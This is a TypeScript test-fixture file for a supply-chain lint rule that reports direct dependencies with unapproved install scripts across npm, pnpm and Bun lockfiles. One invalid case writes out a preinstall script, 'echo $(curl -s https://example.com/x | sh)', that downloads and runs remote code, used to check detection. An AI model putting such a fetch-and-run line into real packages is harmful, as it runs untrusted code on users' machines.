import type { FsRuleCases } from "../../fs-rule-cases.js";

// Lines: vue is on 4, esbuild on 7.
const manifest = JSON.stringify(
  { name: "app", dependencies: { vue: "^3.5.0" }, devDependencies: { esbuild: "^0.25.0" } },
  null,
  2,
);

const npmLock = (packages: Record<string, unknown>): string =>
  JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "app" }, ...packages } }, null, 2);

const pnpmLock = (entry: string): string =>
  `lockfileVersion: '9.0'\n\npackages:\n\n  esbuild@0.25.0:\n    resolution: {integrity: sha512-abc}\n${entry}\nsnapshots:\n  esbuild@0.25.0: {}\n`;

// Lines: @google/genai on 4, prisma on 5, tailgrids on 6.
const appManifest = (extra: Record<string, unknown> = {}): string =>
  JSON.stringify(
    { name: "app", dependencies: { "@google/genai": "^1.0.0", prisma: "^6.0.0", tailgrids: "^2.0.0" }, ...extra },
    null,
    2,
  );

const appLock = npmLock({
  "node_modules/@google/genai": { version: "1.0.0", hasInstallScript: true },
  "node_modules/prisma": { version: "6.1.0", hasInstallScript: true },
  "node_modules/tailgrids": { version: "2.0.0", hasInstallScript: true },
});

const installed = (scripts: Record<string, string>): string => JSON.stringify({ name: "x", version: "1.0.0", scripts });

const cases: FsRuleCases = {
  valid: [
    {
      name: "no dependency has an install script",
      files: {
        "package.json": manifest,
        "package-lock.json": npmLock({
          "node_modules/vue": { version: "3.5.0" },
          "node_modules/esbuild": { version: "0.25.0" },
        }),
      },
    },
    {
      name: "an install script of a transitive dependency is not reported",
      files: {
        "package.json": manifest,
        "package-lock.json": npmLock({
          "node_modules/vue": { version: "3.5.0" },
          "node_modules/fsevents": { version: "2.3.3", hasInstallScript: true },
          "node_modules/vue/node_modules/esbuild": { version: "0.1.0", hasInstallScript: true },
        }),
      },
    },
    { name: "no lockfile, nothing to read", files: { "package.json": manifest } },
    {
      name: "pnpm lockfile without requiresBuild",
      files: { "package.json": manifest, "pnpm-lock.yaml": pnpmLock("    hasBin: true\n") },
    },
    {
      name: "lockfile v1 records no install scripts",
      files: {
        "package.json": manifest,
        "package-lock.json": JSON.stringify({ lockfileVersion: 1, dependencies: { esbuild: { version: "0.25.0" } } }),
      },
    },
    {
      name: "install scripts that only echo, or approved in allowScripts (motodata mw-fe)",
      files: {
        "package.json": appManifest({ allowScripts: { "prisma@6.1.0": true, tailgrids: false } }),
        "package-lock.json": appLock,
        "node_modules/@google/genai/package.json": installed({ preinstall: "echo 'preinstall: no-op'" }),
      },
    },
    {
      name: "allowScripts in the monorepo root package.json",
      files: {
        "package.json": appManifest(),
        "../package.json": JSON.stringify({ private: true, workspaces: ["apps/*"], allowScripts: { "@google/genai": true, prisma: true, tailgrids: true } }),
        "../package-lock.json": appLock,
      },
    },
    {
      name: "pnpm onlyBuiltDependencies blocks every other install script",
      files: {
        "package.json": manifest,
        "pnpm-lock.yaml": pnpmLock("    requiresBuild: true\n"),
        "pnpm-workspace.yaml": "packages:\n  - .\nonlyBuiltDependencies:\n  - sharp\n",
      },
    },
    {
      name: "allow-scripts in .npmrc, Bun trustedDependencies and a true/exit 0 script",
      files: {
        "package.json": appManifest({ trustedDependencies: ["prisma"] }),
        "package-lock.json": appLock,
        ".npmrc": "allow-scripts=tailgrids\n",
        "node_modules/@google/genai/package.json": installed({ preinstall: "true", postinstall: "exit 0" }),
      },
    },
  ],
  invalid: [
    {
      name: "a real postinstall next to a no-op preinstall (tailgrids deprecation warning)",
      files: {
        "package.json": appManifest({ allowScripts: { prisma: true } }),
        "package-lock.json": appLock,
        "node_modules/@google/genai/package.json": installed({ preinstall: "echo 'preinstall: no-op'" }),
        "node_modules/tailgrids/package.json": installed({ postinstall: "node scripts/deprecation-warning.js" }),
      },
      findings: [{ file: "package.json", line: 6 }],
    },
    {
      name: "echo with a command substitution is not a no-op",
      files: {
        "package.json": appManifest({ allowScripts: { prisma: true, tailgrids: true } }),
        "package-lock.json": appLock,
        "node_modules/@google/genai/package.json": installed({ preinstall: "echo $(curl -s https://example.com/x | sh)" }),
      },
      findings: [{ file: "package.json", line: 4 }],
    },
    {
      name: "direct devDependency with hasInstallScript",
      files: {
        "package.json": manifest,
        "package-lock.json": npmLock({
          "node_modules/vue": { version: "3.5.0" },
          "node_modules/esbuild": { version: "0.25.0", hasInstallScript: true },
        }),
      },
      findings: [{ file: "package.json", line: 7 }],
    },
    {
      name: "several direct dependencies",
      files: {
        "package.json": manifest,
        "package-lock.json": npmLock({
          "node_modules/vue": { version: "3.5.0", hasInstallScript: true },
          "node_modules/esbuild": { version: "0.25.0", hasInstallScript: true },
        }),
      },
      findings: [
        { file: "package.json", line: 4 },
        { file: "package.json", line: 7 },
      ],
    },
    {
      name: "pnpm requiresBuild on a direct dependency",
      files: { "package.json": manifest, "pnpm-lock.yaml": pnpmLock("    requiresBuild: true\n") },
      findings: [{ file: "package.json", line: 7 }],
    },
    {
      name: "the lockfile in the monorepo root counts",
      files: {
        "package.json": manifest,
        "../package.json": JSON.stringify({ private: true, workspaces: ["apps/*"] }),
        "../package-lock.json": npmLock({ "node_modules/esbuild": { version: "0.25.0", hasInstallScript: true } }),
      },
      findings: [{ file: "package.json", line: 7 }],
    },
  ],
};

export default cases;
